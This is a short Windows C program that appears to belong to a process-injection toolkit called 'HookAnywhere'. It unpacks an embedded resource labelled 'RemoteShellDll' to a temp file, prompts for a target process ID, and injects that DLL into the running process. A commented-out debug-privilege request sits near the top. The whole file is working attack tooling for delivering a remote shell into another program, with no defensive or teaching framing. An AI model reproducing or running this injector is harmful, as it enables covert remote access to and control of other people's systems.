#include <stdio.h>

#include "HookAnywhere.h"

#include "resource.h"

int main()
{
	/*if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
		printf("SetPrivilege failed (System error %d)\n", GetLastError());*/

	HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_BIN1), "BIN");

	if (hRes == 0)
	{
		printf_s("Cant't find resource\n");
		return 1;
	}

	DWORD dwSize = SizeofResource(NULL, hRes);
	HGLOBAL hData = LoadResource(NULL, hRes);

	if (hData == 0)
	{
		printf_s("Cant't load resource\n");
		return 2;
	}

	PVOID pData = LockResource(hData);

	if (pData == 0)
	{
		printf_s("Cant't lock resource\n");
		return 3;
	}

	CHAR tmpPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tmpPath);
	snprintf(tmpPath, MAX_PATH, "%s1.tmp", tmpPath);

	printf_s("RemoteShellDll location: %s\n", tmpPath);
	HANDLE hFile = CreateFileA(tmpPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Cant't create temp file\n");
		return 4;
	}

	DWORD written;

	if (!WriteFile(hFile, pData, dwSize, &written, 0))
	{
		printf_s("Cant't write file\n");
		CloseHandle(hFile);
		return 5;
	}

	CloseHandle(hFile);
	DWORD pid;

	printf_s("PID to inject: ");
	scanf_s("%d", &pid);

	DWORD err;

	if ((err = InjectDll(pid, tmpPath, TRUE)) != 0)
	{
		printf_s("Cant't inject module ");

		if (err == RESULT_SYSTEM_ERROR)
			printf_s("(System error %d)\n", GetLastError());
		else
			printf_s("(Internal error %x)\n", err);

		return 6;
	}

	printf_s("Injected successfully!\n");

	return 0;
}
